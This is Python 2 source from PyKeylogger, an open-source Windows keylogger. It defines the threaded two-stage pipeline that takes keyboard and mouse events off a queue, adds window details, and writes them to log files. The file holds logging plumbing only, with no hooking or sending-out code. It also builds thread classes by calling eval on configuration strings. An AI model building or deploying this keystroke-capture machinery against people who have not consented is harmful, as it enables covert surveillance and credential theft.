##############################################################################
##
## PyKeylogger: Simple Python Keylogger for Windows
## Copyright (C) 2009  nanotube@users.sf.net
##
## http://pykeylogger.sourceforge.net/
##
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 3
## of the License, or (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##
##############################################################################

from threading import Thread, Event, RLock
from myutils import (_settings, _cmdoptions, OnDemandRotatingFileHandler,
    to_unicode)
from Queue import Queue, Empty
from timerthreads import *
import os
import os.path
import logging
import re


'''Event classes have two stages. The thinking is as follows.

The actual hooking routine needs to be /really/ fast, so as not to delay
user input. So it just shoves the event in a Queue and moves on. This
stage happens in the main keylogger class.

The first stage of processing the queue items needs to be /pretty/ fast,
because we need to grab various window attributes or screenshots etc.,
and this needs to happen expeditiously before windows disappear. We then
stick the processed events into another queue.

The second stage of processing can be slow. All it needs to do is
massage the info it receives, and then write it out to disk
in whatever format required.'''

__all__ = ['FirstStageBaseEventClass','SecondStageBaseEventClass']

class BaseEventClass(Thread):
    '''This is the base class for event-based threads.
    
    Event-based threads are ones that work off keyboard or mouse events.
    
    These classes are the main "logging" threads.
    Each one gets a Queue as an argument from which it pops off events,
    and a logger name argument which is where the logs go.
    '''
    def __init__(self, event_queue, loggername, *args, **kwargs):
        Thread.__init__(self)
        self.finished = Event()
        
        self.q = event_queue
        self.loggername = loggername
        self.args = args # arguments, if any, to pass to task_function
        self.kwargs = kwargs # keyword args, if any, to pass to task_function
        
        self.settings = _settings['settings']
        self.cmdoptions = _cmdoptions['cmdoptions']
        
        self.subsettings = self.settings[loggername]        
    
    def cancel(self):
        '''Stop the iteration'''
        self.finished.set()
        
    def run(self):
        while not self.finished.isSet():
            self.task_function(*self.args, **self.kwargs)
                
    def task_function(self): # to be overridden in derived classes.
        try:
            event = self.q.get(timeout=0.05)
            print event
        except Empty:
            pass #let's keep iterating
        except:
            self.logger.debug("some exception was caught in "
                "the logwriter loop...\nhere it is:\n", exc_info=True)
            pass #let's keep iterating


class FirstStageBaseEventClass(BaseEventClass):
    '''Adds system attributes to events from hook queue, and passes them on.
    
    These classes also serve as the "controller" classes. They create
    the logger, and spawn all the related timer-based threads for the logger.
    '''

    def __init__(self, *args, **kwargs):
        
        BaseEventClass.__init__(self, *args, **kwargs)
        
        self.dir_lock = RLock()
                
        self.create_loggers()
        self.spawn_timer_threads()
        self.spawn_second_stage_thread()
        
        # set the following in the derived class
        #self.task_function = self.your_working_function
    
    def create_log_directory(self, logdir):
        '''Make sure we have the directory where we want to log'''
        try:
            os.makedirs(logdir)
        except OSError, detail:
            if(detail.errno==17):  #if directory already exists, swallow the error
                pass
            else:
                self.logger.error("error creating log directory", 
                        exc_info=True)
        except:
            self.logger.error("error creating log directory", 
                        exc_info=True)

    def create_loggers(self):
        
        # configure the data logger
        self.logger = logging.getLogger(self.loggername)
        logdir = os.path.join(self.settings['General']['Log Directory'],
                            self.subsettings['General']['Log Subdirectory'])
        
        # Regexp filter for the non-allowed characters in windows filenames.
        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")
        self.subsettings['General']['Log Filename'] = \
           self.filter.sub(r'__',self.subsettings['General']['Log Filename'])
           
        logpath = os.path.join(logdir, 
                            self.subsettings['General']['Log Filename'])
                                
        self.create_log_directory(logdir)
        
        loghandler = OnDemandRotatingFileHandler(logpath)
        loghandler.setLevel(logging.INFO)
        logformatter = logging.Formatter('%(message)s')
        loghandler.setFormatter(logformatter)
        self.logger.addHandler(loghandler)
    
    def spawn_timer_threads(self):
        self.timer_threads = {}
        for section in self.subsettings.sections:
            if section != 'General':
                try:
                    self.logger.debug('Creating thread %s' % section)
                    self.timer_threads[section] = \
                        eval(self.subsettings[section]['_Thread_Class'] + \
                        '(self.dir_lock, self.loggername)')
                except KeyError:
                    self.logger.debug('Error creating thread %s' % section,
                                exc_info=True)
                    pass # this is not a thread to be started.
    
    def spawn_second_stage_thread(self): # override in derived class
        self.sst_q = Queue(0)
        self.sst = SecondStageBaseEventClass(self.dir_lock, self.sst_q, self.loggername)
        
    def run(self):
        for key in self.timer_threads.keys():
            if self.subsettings[key]['Enable ' + key]:
                self.logger.debug('Starting thread %s: %s' % \
                        (key, self.timer_threads[key]))
                self.timer_threads[key].start()
            else:
                self.logger.debug('Not starting thread %s: %s' % \
                        (key, self.timer_threads[key]))
        self.sst.start()
        BaseEventClass.run(self)
            
    def cancel(self):
        for key in self.timer_threads.keys():
            self.timer_threads[key].cancel()
        self.sst.cancel()
        BaseEventClass.cancel(self)
        

class SecondStageBaseEventClass(BaseEventClass):
    '''Takes events from queue and writes to disk.
    
    The queue in question is the "secondary" queue passed in from
    the first stage class.
    '''
    
    def __init__(self, dir_lock, *args, **kwargs):
        
        BaseEventClass.__init__(self, *args, **kwargs)
        
        self.dir_lock = dir_lock
        self.logger = logging.getLogger(self.loggername)
        
        # set the following in the derived class
        #self.task_function = self.your_working_function

# some testing code
if __name__ == '__main__':
    from configobj import ConfigObj
    import time
    
    _settings['settings'] = ConfigObj( \
        {'General': \
            {'Log Directory': 'logs'},
            
        'TestLogger': {'General': \
            {'Log Subdirectory': 'testlog',
            'Log Filename':'testlog.txt',
            }}} )
            
            
    _cmdoptions['cmdoptions'] = {}
    q = Queue(0)
    for i in range(10):
        q.put('test %d' % i)
    loggername = 'TestLogger'
    fsbec = FirstStageBaseEventClass(q, loggername)
    fsbec.start()
    time.sleep(1)
    fsbec.cancel()
